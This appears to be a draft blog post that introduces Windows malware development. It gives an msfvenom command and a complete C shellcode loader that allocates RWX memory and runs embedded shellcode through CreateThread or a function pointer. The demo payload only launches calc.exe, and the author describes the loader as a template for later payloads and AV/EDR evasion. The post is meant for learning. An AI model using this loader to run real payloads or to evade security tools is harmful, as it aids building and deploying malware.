+++
title = "Introduction to shellcode execution"
date = "2024-05-12T17:50:19+05:30"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["malware development", "reverse engineering"]
keywords = ["", ""]
description = "Part1: Introduction to malware development - shellcode execution"
showFullContent = false
readingTime = true
hideComments = false
color = "" #color from the theme settings
draft = true
+++

# Introduction
Hey, everyone in this short blog post I’m going to discuss about shellcode execution in windows environment. I know there are a lot of blogs about this topic available online, lately I started learning windows internals and malware development & exploitation on windows platform so I’m writing this blogs to document my process for my own future references. In this blog I’m not going to show any crazy EDR/Anti-virus or AMSI bypass techniques, rather I’m covering the foundational knowledge required to get started in malware development.

```
Disclaimer: 
Malware development is illegal. 
This blog post is for educational purposes only to understand how malware works. 
I am not responsible for any illegal activity resulting from the information provided.
```

In upcoming modules I’ll cover more advanced malware development concepts to bypass AV/EDR solutions. I’m planning to write it as a series of blog posts, so lets get started. If you are a red teamer, exploit developer, malware analyst or simply you want to understand how malware works, this blog post is for you.


# What is a shellcode?
Shellcode is a small piece of assembly code used to exploit a software vulnerability, malware also uses this shellcode to do malicious actions which can be connecting back to a C2, providing reverse shell to attacker or exploiting additional software vulnerabilities for higher privileges. In this blog post we’ll execute a simple calc shellcode which spawns calc.exe program.


I’m using metasploit to create shellcode. Using the below command we will generate the shellcode in a format that we can use it in our malware.

``` bash
msfvenom -p windows/x64/exec CMD='calc.exe' -f c
```

![shellcode generate](/img/intro_to_shellcode_exec/1.png)


I’ll be using C to write the malware, you can use the language which is suitable for you (go, .net, nim, etc).

# Method 1: Shellcode Execution as a Thread

```c
#include <iostream>
#include <Windows.h>

int main()
{
	LPVOID ptr_address;
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


	ptr_address = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(ptr_address, shellcode, sizeof(shellcode));
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr_address, NULL, 0, 0);
	getchar();
	return 0;
}
```

Lets breakdown the code. **ptr_address** is a PVOID data type in windows, which is basically void pointer equivalent to **void \*ptr_address**. Next our shellcode is declared as a variable named shellcode.


**VirtualAlloc** function allocates the requested memory space dynamically in calling process virtual memory which returns a pointer. **MEM_COMMIT | MEM_RESERVE** is used to reserve and commit pages in one step. Check MSDN documentation to learn more. 

**PAGE_EXECUTE_READWRITE** set’s the allocated memory pages permission to RWX, which is required to execute shellcode in memory, alternatively we can use VirtualProtect function to change the permission of the page. By default windows enables DEP (Data Execution Prevention) which prevents us from executing shellcode, so to bypass this restriction we are allocating the memory pages as RWX. 

**RtlMoveMemory** function moves the content of shellcode variable to newly allocated buffer. Basically it’s windows version of memcpy.  

 

**CreateThread** function starts a thread in calling process virtual memory. 3rd parameter to the function is the pointer to be executed. In our case the newly allocated buffer which holds our shellcode. 

Compile the above code using visual studio. Build the project and start executing it, it will spawn the calc.exe process. We can use this base template to test our shellcodes in upcoming blogs.

![shellcode execution](/img/intro_to_shellcode_exec/2.png)

# Method 2: as function pointer

```c
	ptr_address = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(ptr_address, shellcode, sizeof(shellcode));
	int (*fn_ptr)();
	fn_ptr = (int (*)()) (void*)ptr_address;
	(int) (*fn_ptr)();
```

We can execute shellcode as a function pointer as well, you might’ve seen similar code in shellcode tester programs, we are also doing the same. Using memcpy function copied the shellcode to newly allocated buffer. 

Then declaring a function pointer named **fn_ptr**. Then the allocated buffer is type casted to the function pointer type. After that we are executing the function **fn_ptr** indicates as a function pointer. Sounds little confusing right? so let’s look at the assembly equivalent of the program. 

*I’m Ghidra user but for this example I’m using IDA freeware to disassemble the binary*.

![shellcode reversing](/img/intro_to_shellcode_exec/3.png)

In the first block we can see a call to VirtualAlloc function, before the function call the required parameters for the function is placed in the appropriated registers (rcx, rdx, r8, r9), the return address stored in rax register is being moved into r8 register after the call to VirtualAlloc. Then in the next block a call is made to r8 register which is pointing to our shellcode. call is just an unconditional branch instruction so whatever is pointed by r8 register gets executed (In our case our shellcode). In between there is no changes in r8 register. 

In assembly it looks a lot simpler than C source code.


```
Note for this example I've disabled windows defender 
otherwise defender will detect it as malicious executable and removes it
```

# references
https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
